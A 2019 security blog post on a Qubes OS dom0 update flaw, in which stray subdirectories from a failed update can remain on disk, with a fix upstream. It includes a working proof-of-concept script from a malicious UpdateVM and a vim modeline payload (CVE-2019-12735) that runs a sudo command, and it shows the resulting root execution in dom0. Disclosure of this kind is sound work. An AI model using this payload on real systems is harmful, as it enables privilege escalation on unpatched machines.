---
date: 2019-10-06
---

Qubes OS dom0 updates
=====================

Preface
-------

The issue described in this post is **not** a security flaw by itself.
This post merely presents some musings on Qubes OS in an attempt to
improve my writing.

User interaction is required to exploit the bug described below.  More
specifically, a user has to process potentially malicious data after a
failed download/update (e.g. by opening a file with `vim` or navigating
to the download directory with `Thunar`).

Also, this issue along with a few other issues have been fixed in
[e5e006d933b3f45c9bcee6cd891ddc5dd3178816][1].


Updates in `dom0`
-----------------

Qubes OS takes an interesting approach to updating `dom0` (also known as
`AdminVM`).  By default, `dom0` has no networking, so updates can't be
downloaded directly.  Instead, a `domU` with the special [UpdateVM][2]
class is used to download updates on behalf of `dom0`.

The communication between `dom0` and the `UpdateVM` takes place over the
`Qrexec` framework.  [Qrexec][3] is implemented with [Xen vchan][4] and
it exposes a client-server communication channel through shared memory
between `dom0` and `domU`.

The update process in Qubes is designed such that `dom0` uses a script
called `qubes-dom0-update` to send its configuration and list of
repositories to the `UpdateVM`.  The `UpdateVM` then downloads any
available updates and sends them to dom0 with an RPC service called
`qubes.ReceiveUpdates`.

The RPC service runs in `dom0` and delegates execution to a program
named `qubes-receive-updates`.  This program verifies that the sender is
a legitimate `UpdateVM` and then receives RPM packages from the
`UpdateVM` with a program called `qfile-dom0-unpacker`.  The package
signatures are then verified in `dom0`.  If everything succeeds, a local
file-based repository is created with `createrepo_c` and the packages
are installed.

Now, an interesting aspect of `qfile-dom0-unpacker` is that it not only
handles regular files, but also symbolic links and directories.
However, `qubes-receive-updates` is only interested in regular files,
and it guards against other file types like so:

`qubes-receive-updates`:
```python
 40: package_regex = re.compile(r"^[A-Za-z0-9._+-]{1,128}.rpm$")
[...]
 82: subprocess.check_call(["/usr/libexec/qubes/qfile-dom0-unpacker",
 83:     str(os.getuid()), updates_rpm_dir])
 84: # Verify received files
 85: for untrusted_f in os.listdir(updates_rpm_dir):
 86:     if not package_regex.match(untrusted_f):
 87          dom0updates_fatal(updates_rpm_dir + '/' + untrusted_f
 88              'Domain ' + source + ' sent unexpected file: ' + untrusted_f)
 89:     else:
 90:         f = untrusted_f
[...]
 95:         full_path = updates_rpm_dir + "/" + f
[...]
 96:         if os.path.islink(full_path) or not os.path.isfile(full_path):
 97:             dom0updates_fatal(
 98:                 full_path, 'Domain ' + source + ' sent not regular file')
 99:         p = subprocess.Popen(["/bin/rpm", "-K", full_path],
100:                 stdout=subprocess.PIPE)
101:         output = p.communicate()[0].decode('ascii')
102:         if p.returncode != 0:
103:             dom0updates_fatal(full_path,
104:                 'Error while verifing %s signature: %s' % (f, output))
```

The function `dom0updates_fatal()` is invoked on line **97** if the file
isn't a regular non-linked file.  That function looks as follows:

`qubes-receive-updates`:
```python
def dom0updates_fatal(pkg, msg):
    global updates_error_file_handle
    print(msg, file=sys.stderr)
    if updates_error_file_handle is None:
        updates_error_file_handle = open(updates_error_file, "a")
        updates_error_file_handle.write(msg + "\n")
    os.remove(pkg)
```

There are two interesting aspects of the function above.  The first is
that it returns, meaning that execution continues on fatal conditions
(there are a few code paths in `qubes-receive-updates` that assumes that
not to be the case, and exceptions are thrown when a deleted file is
later referenced).

The other interesting behavior of `dom0updates_fatal()` is the use of
`os.remove()` to remove a faulty package.  This is interesting because,
again, `qfile-dom0-unpacker` may create directory structures in
`updates_rpm_dir`.  And `os.remove()` throws an exception if it's given
a directory (which may happen on line **#87** and **#98** in the excerpt
above).

The implication of the previous paragraph is that potentially malicious
files could linger around on the filesystem if they are located in a
subdirectory of the update directory.

Files in these (potentially malicious) subdirectories are **not**
processed by the Qubes update system in any way.  In fact, they are
removed the next time `qubes-receive-updates` executes.  However, these
failures may induce some users to explore the update directory in
between executions of `qubes-receive-updates` (especially if the update
procedure fails constantly in a DoS by a malicious package mirror, MITM
or a compromised `UpdateVM`).  And that is where this issue may become
problematic.

`Dom0` in Qubes 4.0 is built on Fedora 25, which has been end-of-life
since 2017-12-12.  This is generally not seen as an issue, because
`dom0` has no networking and the attack surface is smaller than a
traditional Linux distribution (the Qubes team provides security updates
for the exposed parts of the system; such as the kernel, Xen and
microcode); however it does mean that dom0 has a fair number of programs
that likely has published vulnerabilities.

If a user were to explore the directory structure after a failed update
with a program like [Thunar][5] (included in a default installation of
Qubes 4), then they open themselves up to all sorts of attacks related
to thumbnail rendering and auto-mounting.

Even opening a malicious file in the update directory with something
like [vim][6] is dangerous.

For example, from an evil `UpdateVM`:

```sh
#!/bin/bash

DIR="$HOME/doc"
mkdir -p "$DIR"

ln -s /etc/fedora-release "$DIR/link"
cat >"$DIR/IMPORTANT-UPDATE-NOTES.txt" <<EOF
:!sudo sh -c "id > /etc/pwned" || \
" vi:fen:fdm=expr:fde=assert_fails("source\!\ \%"):fdl=0:fdt="
EOF

qrexec-client-vm dom0 qubes.ReceiveUpdates /usr/lib/qubes/qfile-agent "$DIR"
```

And in `dom0` after `qubes-dom0-update` has failed:

```sh
[user@dom0 ~]$ tree /var/lib/qubes/updates/
/var/lib/qubes/updates/
|-- errors
`-- rpm
    `-- doc
        |-- IMPORTANT-UPDATE-NOTES.txt
        `-- link -> /etc/fedora-release

2 directories, 3 files

[user@dom0 ~]$ cat /var/lib/qubes/updates/rpm/doc/link
Qubes release 4.0 (R4.0)

[user@dom0 ~]$ cat /etc/pwned
cat: /etc/pwned: No such file or directory
[user@dom0 ~]$ vim /var/lib/qubes/updates/rpm/doc/IMPORTANT-UPDATE-NOTES.txt
[...]
[user@dom0 ~]$ cat /etc/pwned
uid=0(root) gid=0(root) groups=0(root)
[user@dom0 ~]$
```

As mentioned in the preface, this issue (along with a few other minor
issues) has been fixed in [master][1].  Furthermore, `UpdateVM`s based
on Fedora verifies package signatures on download before they are
shipped to `dom0` (thus mitigating the risk of a malicious mirror, so
long as the UpdateVM is trusted).  Unfortunately, Debian-based
`UpdateVM`s do **not** verify package signatures before sending them to
`dom0`, but that will change [soon][7].


[1]: https://github.com/QubesOS/qubes-core-admin-linux/commit/e5e006d933b3f45c9bcee6cd891ddc5dd3178816
[2]: https://www.qubes-os.org/doc/dom0-secure-updates/
[3]: https://www.qubes-os.org/doc/qrexec/
[4]: https://www.cs.uic.edu/~xzhang/vchan/
[5]: https://www.qubes-os.org/doc/security-guidelines/
[6]: https://nvd.nist.gov/vuln/detail/CVE-2019-12735
[7]: https://github.com/QubesOS/qubes-core-agent-linux/pull/187
